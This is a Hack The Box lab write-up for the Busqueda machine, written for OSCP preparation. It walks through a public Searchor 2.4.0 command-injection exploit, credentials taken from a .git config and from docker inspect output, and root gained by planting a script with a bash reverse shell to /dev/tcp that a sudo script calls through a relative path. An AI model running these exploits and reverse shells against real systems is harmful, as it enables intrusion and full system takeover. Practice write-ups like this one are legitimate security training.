---
layout: post
title:  HTB Busqueda Write-up
description: Part of the OSCP+ Preparation Series
date:   2024-11-10 3:00:00 +0300
image:  '/images/htb_busqueda.png'
tags:   [Write-ups, HTB, OSCP+, Linux, Easy, Searchor, Git, Gitea, Password-Reuse, SSH, Docker, Bash-Script, Linux-Relative-Path-Abuse]
---

# Table of Contents
- [Enumeration](#enumeration)
  - [Nmap](#nmap)
  - [Web Enumeration](#web-enumeration)
- [Foothold](#foothold)
  - [Searchor 2.4.0 Arbitrary CMD Injection](#searchor-240-arbitrary-cmd-injection)
- [Privilege Escalation](#privilege-escalation)
  - [Credentials on .git directory config file](#credentials-on-git-directory-config-file)
  - [gitea.searcher.htb](#giteasearcherhtb)
  - [Testing password reuse on SSH](#testing-password-reuse-on-ssh)
  - [Extracting information from container](#extracting-information-from-container)
  - [Creating full-checkup.sh script with a reverse shell abusing relative path](#creating-full-checkupsh-script-with-a-reverse-shell-abusing-relative-path)

# Enumeration
### Nmap

```shell
# Step 1 - Find active ports
sudo nmap -p- -Pn --min-rate 10000 10.129.228.217

# Step 2 - Focus scan on the active ports found (Note: In this case is important to use -T4 to make the scan succeed)
sudo nmap -A -T4 -Pn -p22,80 10.129.228.217
```

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-09 21:12 EST
Nmap scan report for 10.129.228.217
Host is up (0.033s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://searcher.htb/
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5.0
OS details: Linux 5.0
Network Distance: 2 hops
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   31.76 ms 10.10.14.1
2   33.38 ms 10.129.228.217

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.05 seconds
```

Examining the Nmap scan, we found a domain called searcher.htb. Lets add it to /etc/hosts:

```shell
echo "10.129.228.217 searcher.htb" | sudo tee -a /etc/hosts
```

### Web Enumeration
Lets take a look at the website:

```shell
http://searcher.htb/
```

It seems to be some kind of search website to run queries.

If we scroll down, we will be able to find a very interesting information:

```shell
Powered by Flask and Searchor 2.4.0
```

# Foothold
### Searchor 2.4.0 Arbitrary CMD Injection

If we google "searchor 2.4.0 exploit" we will find the following exploit:

```shell
https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection
```

It seems like this PoC would give us directly a reverse shell.

Let's run the exploit:

```shell
# Get the exploit
git clone https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection.git
cd Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection

# Start nc listener
nc -lvnp 8443

# Run the exploit as written on the exploit documentation
bash exploit.sh http://searcher.htb/ 10.10.14.206 8443
```

 We will get a result on our nc listener after running the command above:
 
```shell
listening on [any] 8443 ...
connect to [10.10.14.206] from (UNKNOWN) [10.129.228.217] 40280
bash: cannot set terminal process group (1523): Inappropriate ioctl for device
bash: no job control in this shell
svc@busqueda:/var/www/app$ whoami
whoami
svc
```

### User Flag
Now we can get the user.txt flag:

```shell
cat /home/svc/user.txt
```
# Privilege Escalation
### Credentials on .git directory config file
Enumerating the folders we found a .git directory:

```shell
cd /var/www/app/.git
```

Examining the config file we found some credentials and a vhost:

```shell
svc@busqueda:/var/www/app/.git$ cat config
cat config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main

```

This gave us the credentials for the user cody:

```shell
# Username
cody

# Password
jh1usoih2bkjaspwe92
```

### gitea.searcher.htb
Lets add the new vhost to /etc/hosts:

```shell
echo "10.129.228.217 gitea.searcher.htb" | sudo tee -a /etc/hosts
```

Now we can access it through our web browser:

```shell
http://gitea.searcher.htb
```

We can sign in using the credentials of cody:

```shell
# Username
cody

# Password
jh1usoih2bkjaspwe92
```

We did some enumeration after logging in but didnt find much of interest. Only that there is another user called Administrator.

### Testing password reuse on SSH
We can try the credentials we found to log in as svc with the password of cody using SSH:

```shell
ssh svc@searcher.htb
# svc@searcher.htb's password: jh1usoih2bkjaspwe92
```

It worked, we are in!
### sudo -l to find system-checkup.py
Now we can use sudo -l to find if we can run anything as root:

```shell
svc@busqueda:~$ sudo -l
[sudo] password for svc: 
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

It seems the user svc can run system-checkup.py as root.

Lets enumerate the script:

```shell
# Check permissions
ls -l /opt/scripts/system-checkup.py
```

```shell
-rwx--x--x 1 root root 1903 Dec 24  2022 /opt/scripts/system-checkup.py
```

```shell
# Check content of the script
cat /opt/scripts/system-checkup.py
```

```shell
cat: /opt/scripts/system-checkup.py: Permission denied
```

```shell
# Checking usage with -h parameter
sudo python3 /opt/scripts/system-checkup.py -h
```

```shell
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```

Lets check docker-ps:

```shell
sudo python3 /opt/scripts/system-checkup.py docker-ps
```

```shell
CONTAINER ID   IMAGE                COMMAND                  CREATED         STATUS          PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   22 months ago   Up 39 minutes   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   22 months ago   Up 39 minutes   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
```

And docker-inspect:

```shell
sudo python3 /opt/scripts/system-checkup.py docker-inspect gitea
```

```shell
Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>
```

These functions seem to work like the docker functions.

### Extracting information from container

Examining the following documentation:

https://docs.docker.com/reference/cli/docker/inspect/

We found the following interesting information at the bottom:

```shell
### [Get a subsection in JSON format](https://docs.docker.com/reference/cli/docker/inspect/#get-a-subsection-in-json-format)
If you request a field which is itself a structure containing other fields, by default you get a Go-style dump of the inner values. Docker adds a template function, `json`, which can be applied to get results in JSON format.

 docker inspect --format='{{json .Config}}' $INSTANCE_ID
```

This gave us an idea about which command we could run.

Lets try if we can inspect gitea and extract any information from the container:

```shell
sudo python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' gitea | jq
```

```shell
{
  "Hostname": "960873171e2e",
  "Domainname": "",
  "User": "",
  "AttachStdin": false,
  "AttachStdout": false,
  "AttachStderr": false,
  "ExposedPorts": {
    "22/tcp": {},
    "3000/tcp": {}
  },
  "Tty": false,
  "OpenStdin": false,
  "StdinOnce": false,
  "Env": [
    "USER_UID=115",
    "USER_GID=121",
    "GITEA__database__DB_TYPE=mysql",
    "GITEA__database__HOST=db:3306",
    "GITEA__database__NAME=gitea",
    "GITEA__database__USER=gitea",
    "GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh",
    "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
    "USER=git",
    "GITEA_CUSTOM=/data/gitea"
  ],
  "Cmd": [
    "/bin/s6-svscan",
    "/etc/s6"
  ],
  "Image": "gitea/gitea:latest",
  "Volumes": {
    "/data": {},
    "/etc/localtime": {},
    "/etc/timezone": {}
  },
  "WorkingDir": "",
  "Entrypoint": [
    "/usr/bin/entrypoint"
  ],
  "OnBuild": null,
  "Labels": {
    "com.docker.compose.config-hash": "e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515",
    "com.docker.compose.container-number": "1",
    "com.docker.compose.oneoff": "False",
    "com.docker.compose.project": "docker",
    "com.docker.compose.project.config_files": "docker-compose.yml",
    "com.docker.compose.project.working_dir": "/root/scripts/docker",
    "com.docker.compose.service": "server",
    "com.docker.compose.version": "1.29.2",
    "maintainer": "maintainers@gitea.io",
    "org.opencontainers.image.created": "2022-11-24T13:22:00Z",
    "org.opencontainers.image.revision": "9bccc60cf51f3b4070f5506b042a3d9a1442c73d",
    "org.opencontainers.image.source": "https://github.com/go-gitea/gitea.git",
    "org.opencontainers.image.url": "https://github.com/go-gitea/gitea"
  }
}
```

Nice! We were able to extract some information.

This must be the password of the user Administrator for gitea:

```shell
# Username
Administrator

# Password
yuiu1hoiu4i5ho1uh
```

Lets try to log in into gitea.searcher.htb using the following credentials:

```shell
http://gitea.searcher.htb
```

It worked! We got access into gitea as the user Administrator.

Now we can enumerate the code of the scripts present.

### Creating full-checkup.sh script with a reverse shell abusing relative path

Inside system-checkup.py we could find some lines indicating that this script runs another script called full-checkup.sh:

```shell
    elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')
        except:
            print('Something went wrong')
            exit(1)
```

We can try to abuse this creating a bash script called full-checkup.sh containing a reverse shell or just putting the reverse shell into the existing full-checkup.sh.

Note that the file full-checkup.sh is being called from a relative path, not from an absolute path.

First, start a nc listener on Kali:

```shell
nc -lvnp 8080
```

After that, lets create the full-checkup.sh bash script with a reverse shell

```shell
cd /tmp
echo '#!/bin/bash' > full-checkup.sh
echo 'bash -i >& /dev/tcp/10.10.14.206/8080 0>&1' >> full-checkup.sh
chmod +x full-checkup.sh
```

Now run the following command to get our bash script containing the reverse shell executed:

```shell
sudo python3 /opt/scripts/system-checkup.py full-checkup
# Enter password if asked
jh1usoih2bkjaspwe92
```

Nice! We got a response on our nc listener giving us a shell as root:

```shell
listening on [any] 8080 ...
connect to [10.10.14.206] from (UNKNOWN) [10.129.228.217] 44758
root@busqueda:/tmp# whoami
whoami
root
```

### Root Flag
Now we can get the root.txt flag:

```shell
cat /root/root.txt
```

